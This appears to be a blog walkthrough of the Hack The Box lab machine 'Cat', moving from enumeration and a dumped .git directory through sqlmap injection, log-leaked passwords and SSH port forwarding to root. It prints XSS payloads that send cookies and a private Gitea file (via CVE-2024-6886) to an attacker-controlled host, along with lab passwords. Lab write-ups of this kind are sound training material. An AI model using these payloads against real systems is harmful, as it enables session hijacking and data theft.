---
layaout: post
image: /assets/cat/cat.png
title: Cat Write Up HTB
date: 05-07-2025
categories: [Write ups]
tag: [Git-Dumper, Port Forwarding,Linux,Privilege Escalation,XSS Attacks,Medium Difficulty,CVE-2024-6886,Gitea,SQL Injection,SQLmap]
excerpt: "Cat is a medium-difficulty Linux machine that features a custom PHP web application vulnerable to cross-site scripting (XSS), which can trigger an onerror event to bypass the application's security filters. Leveraging this XSS vulnerability, we can perform cookie hijacking to steal an administrator's cookie and elevate our privileges in the application. We can then perform a SQL Injection on a SQLite database to get remote code execution by storing a malicious web shell in the database. With access to the internal application database, we can recover a password from the database by cracking its hash to gain access as a user who has group membership to read server logs. These logs leak a clear-text password to a user accessing an internally hosted Gitea instance on version 1.22.0, vulnerable to an XSS attack via [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886) due to improper input sanitization. By exploiting [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886), we can read a private Gitea repository containing a credential for the root user.

This machine is ideal for intermediate users looking to improve their skills in web application exploitation, including XSS, cookie hijacking, SQL injection in SQLite, privilege escalation through log analysis, and advanced exploitation of modern web platforms like Gitea."
---
![img-description](/assets/cat/cat.png)

Cat is a medium-difficulty Linux machine that features a custom PHP web application vulnerable to cross-site scripting (XSS), which can trigger an onerror event to bypass the application's security filters. Leveraging this XSS vulnerability, we can perform cookie hijacking to steal an administrator's cookie and elevate our privileges in the application. We can then perform a SQL Injection on a SQLite database to get remote code execution by storing a malicious web shell in the database. With access to the internal application database, we can recover a password from the database by cracking its hash to gain access as a user who has group membership to read server logs. These logs leak a clear-text password to a user accessing an internally hosted Gitea instance on version 1.22.0, vulnerable to an XSS attack via [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886) due to improper input sanitization. By exploiting [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886), we can read a private Gitea repository containing a credential for the root user.

This machine is ideal for intermediate users looking to improve their skills in web application exploitation, including XSS, cookie hijacking, SQL injection in SQLite, privilege escalation through log analysis, and advanced exploitation of modern web platforms like Gitea.

## ENUMERATION
---
First we run nmap to see the open ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.53 -oG allPorts
```

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.53 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 13:45 CET
Initiating SYN Stealth Scan at 13:45
Scanning 10.10.11.53 [65535 ports]
Discovered open port 22/tcp on 10.10.11.53
Discovered open port 80/tcp on 10.10.11.53
Completed SYN Stealth Scan at 13:45, 12.22s elapsed (65535 total ports)
Nmap scan report for 10.10.11.53
Host is up, received user-set (0.044s latency).
Scanned at 2025-02-02 13:45:31 CET for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)

```

We see that port 80 and 22 are open, let's investigate port 80, for this we add to /etc/host the IP of the machine and the corresponding domain

```bash
sudo vim /etc/hosts
```

and we add the IP and the domain which in this case is `cat.htb`

## FOOTHOLD
---

Now we proceed to see the page for it in the search engine we put http://cat.htb and this will appear

![Texto alternativo](/assets/cat/Screenshot%202025-02-02%20134840.jpg)
When investigating we do not see anything interesting, so we will perform an analysis of the existing domains with dirsearch.

```bash
dirsearch -u http://cat.htb/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-words-lowercase.txt  -t 50 -e .php,.txt,.html,.dev,.cgi,.pl,.sh -x 503,404 --recursive
```

```bash
dirsearch -u http://cat.htb/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-words-lowercase.txt  -t 50 -e .php,.txt,.html,.dev,.cgi,.pl,.sh -x 503,404 --recursive

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html, dev, cgi, pl, sh | HTTP method: GET | Threads: 50 | Wordlist size: 56293

Output File: /home/ghost/Desktop/HTB/Maquinas/Cat/nmap/reports/http_cat.htb/__25-02-02_13-49-46.txt

Target: http://cat.htb/

[13:49:46] Starting: 
[13:49:46] 403 -  272B  - /.html
[13:49:47] 301 -  300B  - /img  ->  http://cat.htb/img/
Added to the queue: img/
[13:49:47] 301 -  304B  - /uploads  ->  http://cat.htb/uploads/
Added to the queue: uploads/
[13:49:51] 403 -  272B  - /.php
[13:49:51] 403 -  272B  - /.phtml
[13:49:52] 301 -  300B  - /css  ->  http://cat.htb/css/
Added to the queue: css/
[13:49:55] 403 -  272B  - /.htc
[13:49:58] 403 -  272B  - /.htm
[13:49:58] 403 -  272B  - /.html_var_de
[13:50:01] 403 -  272B  - /server-status
[13:50:03] 301 -  304B  - /winners  ->  http://cat.htb/winners/
Added to the queue: winners/
[13:50:04] 301 -  301B  - /.git  ->  http://cat.htb/.git/
Added to the queue: .git/
[13:50:05] 403 -  272B  - /.html.
CTRL+C detected: Pausing threads, please wait...

```

### GIT-DUMPER
---

And we see something interesting, there is a `.git`, therefore with the `gitdumper` tool we are going to obtain all the information from that directory.

```bash
git-dumper http://cat.htb/.git/ output
```

And we see how the page is structured, thanks to this we know that it is vulnerable to `XSS attacks`, therefore we can steal cookies. To do this, we go to the page and in join it asks us to register, so we are going to put this command as the name.

```bash
<script>fetch('http://10.10.10.10/exfil?cookie=' + btoa(document.cookie))</script>
```

And to receive the cookie we create a python server on our machine

```bash
sudo python3 -m server http.server 80
```

Ok now to carry out the `XSS attack` we register with the name mentioned above and once registered we log in where it says already have an account below where you register and we put the same name and password; now for the payload to work we need to upload an image in this section

![Texto alternativo](/assets/cat/Screenshot%202025-02-02%20135914.jpg)

We can take any photo from the internet and upload it. The data you enter does not matter. Once uploaded, we will receive an administrator cookie. It can come to us in 2 ways, one that can be encoded in `base 64` or the normal cookie. If the cookie is normal, you can go to the next step. If it is encoded in `base 64`, we put the following command.

```bash
echo 'UEhQU0VTU0lEPXNqbWpybXJsMDdoNmpjdWRicGFxMmttMzhr' | base64 -d
```

```bash
echo 'UEhQU0VTU0lEPXNqbWpybXJsMDdoNmpjdWRicGFxMmttMzhr' | base64 -d
PHPSESSID=sjmjrmrl07h6jcudbpaq2km38k%
```

It will come out with a `%` at the end, we ignore it and copy the cookie, now we take this cookie and in the inspect panel we put this cookie


![Texto alternativo](/assets/cat/Screenshot%202025-02-02%20140223.jpg)

There we replace what we have received by `double-clicking` and pressing enter and `f5 to restart` the page and now this section will appear.

![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20203735.jpg)

Now we are admin, therefore we can perform a `SQLI via SQLMap` to obtain more information with the cookie obtained.

### SQL INJECTION
---

```bash
sqlmap -u "http:cat.htb/accept_cat.php" data "catId=1&catName=catty" cookie="PHPSESSID=jce8bkemt9o56ut4ucipjbbov1" -p catName level=5 risk=3 dbms=SQLite
```

**IMP: Replace the cookie**

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cookie="PHPSESSID=jce8bkemt9o56ut4ucipjbbov1" -p catName --level=5 --risk=3 
--dbms=SQLite
```

```bash
Parameter: catName (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: catId=1&catName=catty'(SELECT CHAR(114,97,83,88) WHERE 5931=5931
AND 1212=1212)'
Type: time-based blind
Title: SQLite > 2.0 AND time-based blind (heavy query)
Payload: catId=1&catName=catty'(SELECT CHAR(69,77,83,120) WHERE 8467=8467
AND 6442=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))'
```

Two SQL injections are discovered:

    Blind Boolean-based
    Time-based (SQLite)

Now we proceed to list users

```bash
sqlmap -u "http:cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cookie="PHPSESSID=jce8bkemt9o56ut4ucipjbbov1" -p catName --level=5 --risk=3 
--dbms=SQLite --technique=B -T "users" --threads=4 --dump
```

```bash
axel:d1bbba3670feb9435c9841e46e60ee2f
rosa:ac369922d560f17d6eeb8b2c7dec498c
robert:42846631708f69c00ec0c0a8aa4a92ad
fabian:39e153e825c4a3d314a0dc7f7475ddbe
jerryson:781593e060f8d065cd7281c5ec5b4b86
larry:1b6dce240bbfbc0905a664ad199e18f8
peter:e41ccefa439fc454f7eadbf1f139ed8a
angel:24a8ec003ac2e1b3c5953a6f95f8f565
jobert:88e4dceccd48820cf77b5cf6c08698ad
<img src=x onerror=this.src="http://10.10.14.16:8000/"+btoa(document.cookie)>:bfd59291e825b5f2bbf1eb76569f8fe7
~
```

Seeing that all users have hashes, we can try them one by one, which is the most reliable, or go to a cracking page called [CrackStation](https://crackstation.net/) that cracks all the hashes together.

![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20213458.jpg)

We entered with `Rosa` with her password `soyunaprincesarosa` via `SSH`

### SHELL AS AXEL
---

```bash
ssh rosa@cat.htb
```

```bash
ssh rosa@cat.htb
rosa@cat.htb's password: 
Permission denied, please try again.
rosa@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 03 Feb 2025 08:36:18 PM UTC

  System load:           0.09
  Usage of /:            52.0% of 6.06GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             237
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.53
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3686

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
rosa@cat:~$
```

Once we get in we see `the users` that are in the system, for this we can go to the `home directory` and see it
```bash
rosa@cat:/home$ ls
axel  git  jobert  rosa
```

We already know that there are those `users` and when putting the `id` command to see which groups it belongs to, we can see that it belongs to `adm`, which is a group that can see the `machine's logs`.
```bash
rosa@cat:/var/log$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
```

```bash
rosa@cat:/var/log$ ls -la
total 2240
drwxrwxr-x  11 root      syslog            4096 Jul  5 15:01 .
drwxr-xr-x  13 root      root              4096 Jun  6  2024 ..
-rw-r--r--   1 root      root                 0 Jul  5 15:01 alternatives.log
-rw-r--r--   1 root      root              6676 Jan 27 15:58 alternatives.log.1
-rw-r--r--   1 root      root               919 Jan 21 12:49 alternatives.log.2.gz
drwxr-x---   2 root      adm               4096 Jul  5 15:01 apache2
drwxr-xr-x   2 root      root              4096 Jul  5 15:01 apt
drwxr-x---   2 root      adm               4096 Jul  5 15:38 audit
-rw-r-----   1 syslog    adm              13053 Jul  5 16:01 auth.log
-rw-r-----   1 syslog    adm              11682 Jul  5 15:01 auth.log.1
-rw-r-----   1 syslog    adm               2198 Jan 30 15:33 auth.log.2.gz
-rw-r--r--   1 root      root            104003 Mar 14  2023 bootstrap.log
-rw-rw----   1 root      utmp              1536 Jul  5 15:08 btmp
-rw-rw----   1 root      utmp               768 Jan 22 13:04 btmp.1
-rw-r-----   1 syslog    adm                  1 Jan 21 13:02 cloud-init.log
-rw-r-----   1 root      adm             282216 Dec 31  2024 cloud-init-output.log
drwxr-xr-x   2 root      root              4096 Mar 14  2023 dist-upgrade
-rw-r--r--   1 root      adm                  0 Jan 21 13:01 dmesg
-rw-r--r--   1 root      root                 0 Jul  5 15:01 dpkg.log
-rw-r--r--   1 root      root            114107 Jan 27 15:59 dpkg.log.1
-rw-r--r--   1 root      root             32096 Jan 21 12:46 faillog
-rw-r--r--   1 root      root              1340 Jun  5  2024 fontconfig.log
drwxr-x---   3 root      adm               4096 Jun  3  2024 installer
drwxr-sr-x+  3 root      systemd-journal   4096 Jun  3  2024 journal
-rw-r-----   1 syslog    adm                  0 Jul  5 15:01 kern.log
-rw-r-----   1 syslog    adm             653845 Jul  5 15:01 kern.log.1
-rw-r-----   1 syslog    adm             176493 Jan 30 15:33 kern.log.2.gz
drwxr-xr-x   2 landscape landscape         4096 Jun  3  2024 landscape
-rw-rw-r--   1 root      utmp            292876 Jul  5 16:01 lastlog
drwxr-xr-x   2 root      root              4096 Jan 21 12:46 laurel
-rw-r-----   1 syslog    adm              12933 Jul  5 16:00 mail.log
-rw-r-----   1 syslog    adm              12446 Jul  5 15:01 mail.log.1
-rw-r-----   1 syslog    adm                815 Jan 27 16:05 mail.log.2.gz
drwx------   2 root      root              4096 Mar 14  2023 private
-rw-r-----   1 syslog    adm              56623 Jul  5 16:01 syslog
-rw-r-----   1 syslog    adm             255313 Jul  5 15:01 syslog.1
-rw-r-----   1 syslog    adm             131116 Jan 31 11:17 syslog.2.gz
-rw-r--r--   1 root      root                 0 Jul  5 15:01 ubuntu-advantage.log
-rw-r--r--   1 root      root               988 Jan 21 12:36 ubuntu-advantage.log.1
-rw-r--r--   1 root      root                 0 Jul  5 15:01 ubuntu-advantage-timer.log
-rw-r--r--   1 root      root               460 Jan 21 12:38 ubuntu-advantage-timer.log.1
-rw-------   1 root      root               697 Jan 31 11:17 vmware-network.1.log
-rw-------   1 root      root               717 Jan 30 15:40 vmware-network.2.log
-rw-------   1 root      root               697 Jan 30 15:39 vmware-network.3.log
-rw-------   1 root      root               697 Jan 30 15:36 vmware-network.4.log
-rw-------   1 root      root               717 Jan 30 15:35 vmware-network.5.log
-rw-------   1 root      root               697 Jan 30 15:34 vmware-network.6.log
-rw-------   1 root      root               697 Jan 30 15:33 vmware-network.7.log
-rw-------   1 root      root               717 Jan 27 16:05 vmware-network.8.log
-rw-------   1 root      root               697 Jan 27 15:55 vmware-network.9.log
-rw-------   1 root      root               697 Jul  5 15:01 vmware-network.log
-rw-------   1 root      root              2691 Jan 31 11:48 vmware-vmsvc-root.1.log
-rw-------   1 root      root              3055 Jan 30 15:41 vmware-vmsvc-root.2.log
-rw-------   1 root      root              2691 Jan 30 15:38 vmware-vmsvc-root.3.log
-rw-------   1 root      root              5816 Jul  5 15:02 vmware-vmsvc-root.log
-rw-------   1 root      root              3720 Jul  5 15:01 vmware-vmtoolsd-root.log
-rw-rw-r--   1 root      utmp            238080 Jul  5 16:01 wtmp
```

So, since we already know that there are those `users`, we put the `grep` command together with the names of the `/home` to see if there is any `password`
```bash
grep axel /var/log/apache2 -R
```

```bash
/var/log/apache2/access.log.1:127.0.0.1 - - [31/Jan/2025:11:31:22 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

And as we see, we get the password `aNdZwgC4tI9gnVXv_e3Q` in this way we can access `axel` with `su axel`

```bash
rosa@cat:/home$ su axel
Password: aNdZwgC4tI9gnVXv_e3Q
axel@cat:/home$ id
uid=1000(axel) gid=1000(axel) groups=1000(axel)
axel@cat:~$ ls
user.txt
```

And here we have the first flag

## PRIVILEGE ESCALATION
---

Now we look at the machine connections

```bash
netstat -tulnp
```

```bash
axel@cat:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40567         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:47705         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35261         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -    
```

And as we can see, there are `ports 25 and 3000`, which are the ones that interest us, since when we entered through `SSH` it told us that we had an `email`, so let's see what that email is about.

```bash
axel@cat:~$:cat /var/mail/axel
From rosa@cat.htb Sat Sep 28 045150 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
for <axel@cat.htb>; Sat, 28 Sep 2024 045150 GMT
Received: (from rosa@localhost)
by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
for axel@localhost; Sat, 28 Sep 2024 045149 GMT
Date: Sat, 28 Sep 2024 045149 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services
Hi Axel,
We are planning to launch new cat-related web services, including a cat care
website and other projects. Please send an email to jobert@localhost with
information about your Gitea repository. Jobert will check if it is a promising
service that we can develop.
Important note: Be sure to include a clear description of the idea so that I can
understand it properly. I will review the whole repository.
From rosa@cat.htb Sat Sep 28 050528 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
for <axel@cat.htb>; Sat, 28 Sep 2024 050528 GMT
Received: (from rosa@localhost)
by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
for axel@localhost; Sat, 28 Sep 2024 050528 GMT
Date: Sat, 28 Sep 2024 050528 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management
We are currently developing an employee management system. Each sector
administrator will be assigned a specific role, while each employee will be able
to consult their assigned tasks. The project is still under development and is
hosted in our private Gitea. You can visit the repository at:
http:localhost:3000/administrator/Employee-management/. In addition, you can
consult the README file, highlighting updates and other important details, at:
http:localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

To see what is on `port 3000`,  we perform Port forwarding through `SSH`.

### PORT FORWARDING VIA SSH
---

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb

axel@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 03 Feb 2025 08:46:41 PM UTC

  System load:           0.09
  Usage of /:            53.8% of 6.06GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             238
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.53
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3686

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Mon Feb  3 20:40:07 2025 from 127.0.0.1
```

Once the port forwarding is done, we can access the page on our local machine through localhost and port `3000` asks us to register, we register with the same credentials `axel:aNdZwgC4tI9gnVXv_e3Q`
We can see that it is a `Gitea page` and if we look at the version and investigate, we see that it is vulnerable ,this version of `Gitea` has `Stored XSS - CVE-2024-6886` . Therefore, what we have to do is create a repository with the following code

```bash
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.16:8000/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
```

![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20215120.jpg)

And we create a file with the text `test`.

**IMP: If you don't put anything inside, the XSS won't reach you.**

![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20215234.jpg)

Now we will send an `email to Jobert` so that he gives us his password; for this we also have to do port forwarding to `port 25` and also put ourselves in a Python server, in my case on `port 8000`.

```bash
ssh -L 25:127.0.0.1:25 axel@cat.htb
```

```bash
python3 -m http.server 8000
```

Once done, we send the following command to our machine to send an email to jobert.

**IMP: In --body, we change it after axel/(name of your repository)**

```bash
swaks --to "jobert@localhost" --from "axel@localhost" --header "Subject: click link" --body "http://localhost:3000/axel/aaa" --server localhost --port 25 --timeout 30s
```

```bash
swaks --to "jobert@localhost" --from "axel@localhost" --header "Subject: click link" --body "http://localhost:3000/axel/aaa" --server localhost --port 25 --timeout 30s

=== Trying localhost:25...
=== Connected to localhost.
<-  220 cat.htb ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Mon, 3 Feb 2025 20:58:16 GMT; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]
 -> EHLO kali.kali
<-  250-cat.htb Hello localhost [127.0.0.1], pleased to meet you
<-  250-ENHANCEDSTATUSCODES
<-  250-PIPELINING
<-  250-EXPN
<-  250-VERB
<-  250-8BITMIME
<-  250-SIZE
<-  250-DSN
<-  250-ETRN
<-  250-AUTH DIGEST-MD5 CRAM-MD5
<-  250-DELIVERBY
<-  250 HELP
 -> MAIL FROM:<axel@localhost>
<-  250 2.1.0 <axel@localhost>... Sender ok
 -> RCPT TO:<jobert@localhost>
<-  250 2.1.5 <jobert@localhost>... Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 03 Feb 2025 21:58:16 +0100
 -> To: jobert@localhost
 -> From: axel@localhost
 -> Subject: click link
 -> Message-Id: <20250203215816.151023@kali.kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> http://localhost:3000/axel/xss
 -> 
 -> 
 -> .
<-  250 2.0.0 513KwGeI003719 Message accepted for delivery
 -> QUIT
<-  221 2.0.0 cat.htb closing connection
=== Connection closed with remote host.

```

And we get a `password on Python server`.

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.53 - - [03/Feb/2025 22:03:25] "GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1" 200 -
```

`PASS: IKw75eR0MR7CMIxhH0`

Now we can perform su and put `this password to access root`

```bash
axel@cat:~$ su
Password: IKw75eR0MR7CMIxhH0
root@cat:/home/axel# 
```

Now we go to `/root` and take the flag
```bash
root@cat:/home/axel# cd /root
root@cat:~# ls
root.txt  scripts
root@cat:~# 
```

And now we have both flags!